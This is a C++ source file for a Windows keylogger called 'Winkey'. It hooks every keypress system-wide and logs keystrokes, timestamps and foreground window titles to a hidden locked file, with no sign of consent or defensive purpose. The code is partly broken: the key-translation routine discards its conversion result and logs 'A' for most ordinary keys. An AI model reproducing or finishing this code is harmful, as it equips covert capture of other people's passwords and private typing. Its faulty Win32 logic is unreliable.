#include "winkey.h"

Winkey::Winkey() {
	gLogHandle = CreateFileA(
		LOG_FILE,
		GENERIC_WRITE,
		0,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (gLogHandle == INVALID_HANDLE_VALUE) {
		throw std::runtime_error(std::format("CreateFile failed ({})\n", GetLastError()));
	}

	OVERLAPPED overlap = {0};

	if (!LockFileEx(
		gLogHandle,
		LOCKFILE_EXCLUSIVE_LOCK | LOCKFILE_FAIL_IMMEDIATELY,
		0,
		1,
		0,
		&overlap
	)) {
		throw std::runtime_error(std::format("LockFileEx failed ({})\n", GetLastError()));
	}
}

Winkey::~Winkey() {
	if (gLogHandle == nullptr) {
		return;
	}

	OVERLAPPED overlap = { 0 };

	if (!UnlockFileEx(gLogHandle, 0, 1, 0, &overlap)) {
		std::cout << std::format("UnlockFileEx failed ({})\n", GetLastError());
	}
	CloseHandle(gLogHandle);

	gLogHandle = nullptr;
}

int Winkey::Hook() {
	HHOOK kbdHook = SetWindowsHookExA(
		WH_KEYBOARD_LL,
		&Winkey::onKey,
		NULL,
		0
	);
	if (kbdHook == nullptr) {
		std::cout << std::format("SetWindowsHookExA failed ({})\n", GetLastError());
		return 1;
	}

	HWINEVENTHOOK winHook = SetWinEventHook(
		EVENT_SYSTEM_FOREGROUND,
		EVENT_SYSTEM_FOREGROUND,
		NULL,
		(WINEVENTPROC) & Winkey::onWindow,
		0,
		0,
		WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS
	);
	if (winHook == nullptr) {
		std::cout << std::format("SetWinEventHook failed ({})\n", GetLastError());
		return 1;
	}

	MSG msg;
	while (GetMessage(&msg, NULL, WM_INPUT, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

/*
	HOOKPROC onKey;
*/
LRESULT CALLBACK Winkey::onKey(int nCode, WPARAM wParam, LPARAM lParam) {
	if (wParam == WM_KEYDOWN) {
		KBDLLHOOKSTRUCT* kbdEv = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

		logCurrentWindow();

		const char* data = solve(kbdEv);
		DWORD bytesWrote;
		WriteFile(gLogHandle, data, std::strlen(data), &bytesWrote, NULL);
	}

	/* Forward to next hooks ... */
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/*
	WINEVENTPROC onWindow;
*/
LRESULT CALLBACK Winkey::onWindow(HWINEVENTHOOK hWinEventHook,
	DWORD event,
	HWND hwnd,
	LONG idObject,
	LONG idChild,
	DWORD idEventThread,
	DWORD dwmsEventTime
) {
	(void)hWinEventHook;
	(void)event;
	(void)idObject;
	(void)idChild;
	(void)idEventThread;
	(void)dwmsEventTime;

	GetWindowText(hwnd, gLastWindowTitle, sizeof(gLastWindowTitle));
	gReportNextWindow = true;

	return 0;
}

const char *Winkey::solve(KBDLLHOOKSTRUCT *kbdEv) {
	switch (kbdEv->vkCode) {
	case VK_BACK:		return "[BACKSPACE]";
	case VK_ESCAPE:		return "[ESC]";
	case VK_DELETE:		return "[DELETE]";
	case VK_LEFT:		return "[LEFTARROW]";
	case VK_UP:			return "[UPARROW]";
	case VK_RIGHT:		return "[RIGHTARROW]";
	case VK_DOWN:		return "[DOWNARROW]";
	case VK_SPACE:		return " ";
	case VK_TAB:		return "[TAB]";
	case VK_CAPITAL:	return "[CAPSLOCK]";
	case VK_SHIFT:
	case VK_LSHIFT:
	case VK_RSHIFT:		return "[SHIFT]";
	case VK_CONTROL:
	case VK_LCONTROL:
	case VK_RCONTROL:	return "[CTRL]";
	case VK_RETURN:		return "\\n";
	default:
		BYTE keyboardState[256];
		GetKeyboardState(keyboardState);

		CHAR unicodeBuffer[16] = {0};
		ToUnicode(
			kbdEv->vkCode,
			kbdEv->scanCode,
			keyboardState,
			reinterpret_cast<LPWSTR>(unicodeBuffer),
			8,
			0
		);

		return "A";
	}
}

void Winkey::logCurrentWindow() {
	if (!gReportNextWindow) {
		return;
	}

	std::time_t t = std::time(nullptr);
	struct tm new_time;
	localtime_s(&new_time, &t);

	char mbstr[100 + sizeof(gLastWindowTitle)] = {0};
	std::strftime(mbstr, sizeof(mbstr), "%d.%m.%Y %H:%M:%S", &new_time);

	const std::string to_write = std::format("[{}] - '{}'\n", mbstr, gLastWindowTitle);

	DWORD bytesWrote;
	WriteFile(gLogHandle, to_write.c_str(), to_write.length(), &bytesWrote, NULL);
}

int __cdecl _tmain(int argc, TCHAR* argv[])
{
	(void)argv;
	if (argc != 1) {
		return 1;
	}

	gLogHandle = nullptr;

	try {
		auto winkey = Winkey();
		return winkey.Hook();
	 }
	catch (const std::runtime_error& e) {
		std::cout << e.what();
		return 1;
	}
}